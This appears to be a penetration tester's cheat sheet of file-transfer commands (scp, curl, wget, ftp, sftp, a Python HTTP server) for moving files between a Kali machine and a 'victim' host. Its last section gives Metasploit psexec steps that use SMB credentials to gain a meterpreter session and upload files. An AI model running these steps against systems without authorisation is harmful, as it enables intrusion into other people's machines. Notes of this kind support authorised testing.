# File Transfers


## SCP (Secure Copy Protocol)
SCP allows you to securely copy files between your local system and a remote system using the SSH protocol. To copy a file from your Kali Linux machine to a remote server (victim machine):  
```scp /path/to/local/file user@remote_server:/path/on/remote/server```  
To copy a file from a remote server to your Kali Linux machine:  
```scp user@remote_server:/path/on/remote/server /path/to/local/file```


## Python HTTP Server
You can use Python's built-in HTTP server for simple file transfers on your local network.  
```python -m http.server <port>```

This will start an HTTP server on port 8000 by default. You can access files via a web browser on your local network.


## Curl
curl is a versatile command-line tool for transferring data with various protocols, including HTTP.  To download a file from a remote server to your Kali Linux machine using curl:  
```curl -o local_filename http://example.com/remote_file```

To upload a file from your Kali Linux machine to a remote server using curl, you can use tools like FTP or SCP for a more secure transfer.

## FTP (File Transfer Protocol)
You can use FTP to transfer files between your local system and a remote server. There are various FTP clients available for Linux, such as ftp or graphical clients like FileZilla.
### To download a file from an FTP server to your Kali Linux machine using the ftp command:  
```ftp ftp.example.com```
```# Log in with your credentials```
```ftp> get remote_file```

### To upload a file to an FTP server:  
```ftp ftp.example.com```
```# Log in with your credentials```
```ftp> put local_file```





## SFTP (SSH File Transfer Protocol)
SFTP provides secure file transfers over an SSH connection. It is similar to SCP but provides a more interactive file transfer experience. To transfer files with SFTP, you can use the sftp command:  
```sftp user@remote_server```

Once connected, you can use commands like get and put to transfer files.


## Wget
wget is another command-line utility for downloading files from the internet.
### To download a file to your local machine using wget:
```wget http://example.com/remote_file```


## SMB (If SMB is open on host)
```> msfpro```  
```> use exploit/windows/smb/psexec```  
```> <set rhost, smbuser, and smbpass>```  
```> run```  
```meterpreter> upload /path/on/remote/server /path/to/local/file```
